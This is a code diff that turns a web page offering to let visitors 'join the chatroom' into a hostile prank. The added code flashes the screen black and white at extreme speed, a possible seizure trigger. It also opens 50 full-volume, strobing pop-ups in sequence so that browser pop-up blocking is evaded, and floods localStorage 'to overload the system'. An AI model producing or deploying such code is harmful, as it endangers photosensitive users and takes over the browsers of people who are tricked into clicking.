@@ -17,7 +17,7 @@
     <button onclick="startEffect()">Join the chatroom!</button>
 
     <audio id="audioPlayer" loop>
-        <source src="your-audio-file.mp3" type="audio/mp3">
+        <source src="aaa.mp3" type="audio/mp3">
         Your browser does not support the audio element.
     </audio>
 
@@ -28,42 +28,47 @@
         function startEffect() {
             audio.play(); // Start the main audio
             startFlashingColors(); // Start flashing colors on the main page
-            createPopups(); // Create pop-ups that play the same audio and flash colors
+            createPopups(50); // Create multiple pop-ups (sequentially, 50 pop-ups for example)
         }
 
         function startFlashingColors() {
-            // Flash the main page background randomly
+            // Flash the main page background white and black ultra fast
             setInterval(function() {
-                document.body.style.backgroundColor = getRandomColor();
-            }, 100); // Change color every 100ms
+                document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
+            }, 0.00001); // Flash every ultra-fast interval
         }
 
-        function createPopups() {
-            // Create multiple pop-ups that each play the same audio and flash colors
-            for (let i = 0; i < 5; i++) {
-                let popup = window.open('', '', 'width=300,height=200');
-                popup.document.write('<html><head><title>Pop-up</title></head><body style="background-color:white;"><audio id="audio" loop><source src="your-audio-file.mp3" type="audio/mp3">Your browser does not support the audio element.</audio></body></html>');
-                
-                let popupAudio = popup.document.getElementById('audio');
-                popupAudio.volume = 1; // Set the audio volume to full
-                popupAudio.play(); // Start playing the audio
-                
-                // Flash random background color in the pop-up
-                popup.setInterval(function() {
-                    popup.document.body.style.backgroundColor = getRandomColor();
-                }, 100); // Flash color every 100ms
+        function createPopups(count) {
+            // Open pop-ups sequentially to prevent being blocked by the browser
+            var popupIndex = 0;
+            function openNextPopup() {
+                if (popupIndex < count) {
+                    let popup = window.open('', '', 'width=300,height=200');
+                    if (popup) {
+                        popup.document.write('<html><head><title>Pop-up</title></head><body style="background-color:white;"><audio id="audio" loop><source src="your-audio-file.mp3" type="audio/mp3">Your browser does not support the audio element.</audio></body></html>');
+                        let popupAudio = popup.document.getElementById('audio');
+                        popupAudio.volume = 1; // Set the audio volume to full
+                        popupAudio.play(); // Start playing the audio
+                        popup.document.body.style.backgroundColor = 'white';
+
+                        // Flash random background color in the pop-up ultra fast
+                        setInterval(function() {
+                            popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
+                        }, 0.00001); // Flash every ultra-fast interval
+
+                        // Manipulate local storage to overload the system
+                        for (let i = 0; i < 10000; i++) {
+                            localStorage.setItem('key' + i, 'value' + i);
+                        }
+
+                        popupIndex++;
+                        setTimeout(openNextPopup, 1); // Open the next pop-up every millisecond to avoid blocking
+                    }
+                }
             }
+            openNextPopup(); // Start opening pop-ups
         }
 
-        // Function to get a random color
-        function getRandomColor() {
-            const letters = '0123456789ABCDEF';
-            let color = '#';
-            for (let i = 0; i < 6; i++) {
-                color += letters[Math.floor(Math.random() * 16)];
-            }
-            return color;
-        }
     </script>
 
 </body>
